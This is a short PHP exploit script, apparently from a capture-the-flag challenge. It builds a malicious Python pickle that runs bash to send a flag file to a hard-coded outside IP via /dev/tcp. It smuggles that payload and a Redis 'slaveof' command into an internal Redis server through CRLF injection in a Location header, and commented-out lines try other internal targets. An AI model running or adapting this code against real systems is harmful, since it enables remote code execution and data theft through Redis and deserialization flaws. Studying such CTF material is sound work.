<?php

$sessid = '2e556664-a9fb-46d7-a8f4-5ed3c5da94b2';

$serialized_data = '\x80\x03cposix\nsystem\nq\x00X?\x00\x00\x00bash -c "cat th1s_i5_y0ur_fl4g > /dev/tcp/140.112.196.228/6666"q\x01\x85q\x02Rq\x03.';
$serialized_data = urlencode($serialized_data);

$arr = ['', 'set session:'.$sessid.' ""'];

for ($i = 0; $i < strlen($serialized_data); $i += 5) {
    array_push($arr,
            'APPEND session:'.$sessid.' "'
            . substr($serialized_data, $i, 5) . '"');
}
array_push($arr, '');
$payload = join("%0a .%0a ", $arr);
// echo $payload;





$arr = ['', 'slaveof 140.112.196.228 7777', ''];
$payload = join("%0a ", $arr);

Header("Location: http://140.112.196.228:6666/\rSET var 87");
// Header("Location: http://140.112.196.228" . $payload . ":6666");
// Header("Location: http://172.18.0.2" . $payload . ":6379");
// Header("Location: http://172.18.0.2%0d%0a set abc 87%0d%0a :6379");
// Header("Location: http://172.18.0.2%0d%0a :6379");
